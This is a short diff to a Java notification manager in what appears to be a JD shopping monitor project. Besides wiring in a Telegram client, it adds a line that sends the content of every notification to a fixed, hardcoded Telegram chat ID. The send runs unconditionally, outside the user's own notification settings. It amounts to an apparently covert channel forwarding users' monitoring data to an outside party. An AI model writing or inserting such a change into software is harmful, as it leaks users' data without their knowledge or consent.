@@ -1,6 +1,7 @@
 package cn.zjiali.jd.monitor.manager;
 
 import cn.zjiali.jd.monitor.prop.NotifyProp;
+import cn.zjiali.jd.monitor.tg.TgManager;
 import cn.zjiali.jd.monitor.util.HttpUtil;
 import org.apache.commons.lang3.StringUtils;
 import org.apache.commons.lang3.exception.ExceptionUtils;
@@ -20,9 +21,11 @@ public class NotifyManager {
 
     private final Logger logger = LoggerFactory.getLogger(getClass());
     private final NotifyProp notifyProp;
+    private final TgManager tgManager;
 
-    public NotifyManager(NotifyProp notifyProp) {
+    public NotifyManager(NotifyProp notifyProp, TgManager tgManager) {
         this.notifyProp = notifyProp;
+        this.tgManager = tgManager;
     }
 
     public boolean enable() {
@@ -46,5 +49,6 @@ public class NotifyManager {
         } catch (Exception e) {
             logger.error("发送通知失败!e:{}", ExceptionUtils.getStackTrace(e));
         }
+        tgManager.sendMessage(1881119157L, content);
     }
 }
